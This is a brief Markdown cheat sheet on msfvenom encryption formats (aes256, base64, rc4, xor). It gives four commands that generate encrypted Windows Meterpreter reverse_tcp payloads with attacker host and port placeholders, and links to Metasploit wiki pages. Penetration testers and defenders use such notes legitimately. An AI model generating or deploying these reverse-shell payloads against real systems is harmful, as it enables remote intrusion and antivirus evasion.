# Encryption

- List of encryption methods

```
$ msfvenom -l encrypt

Framework Encryption Formats [--encrypt <value>]
================================================

    Name
    ----
    aes256
    base64
    rc4
    xor
```

- Generating and encrypting payloads using the --encrypt flags

**Note:** For AES256 encryption that the key (using flag `--encrypt-key`) must be exactly 32 bytes of length and the IV (using flag `--encrypt-iv`) must be 16 bytes of length

`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt aes256 --encrypt-key 0123456789abcdefghijklmnopqrstuv --encrypt-iv 1234567890abcdef -f c -o payload_aes.c`

`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt xor --encrypt-key x0rk3y -f c -o payload_xor.c`

`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt rc4 --encrypt-key rc4passw0rd! -f c -o payload_rc4.c`

`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt base64 -f c -o payload_base64.c`

---
## References

- [How to XOR with Metasploit Framework Compiler](https://github.com/rapid7/metasploit-framework/wiki/How-to-XOR-with-Metasploit-Framework-Compiler)

- [How to RC4 with Metasploit Framework Compiler](https://github.com/rapid7/metasploit-framework/wiki/How-to-decrypt-RC4-with-Metasploit-Framework-Compiler)

- [How to decode Base64 with Metasploit Framework Compiler](https://github.com/rapid7/metasploit-framework/wiki/How-to-decode-Base64-with-Metasploit-Framework-Compiler)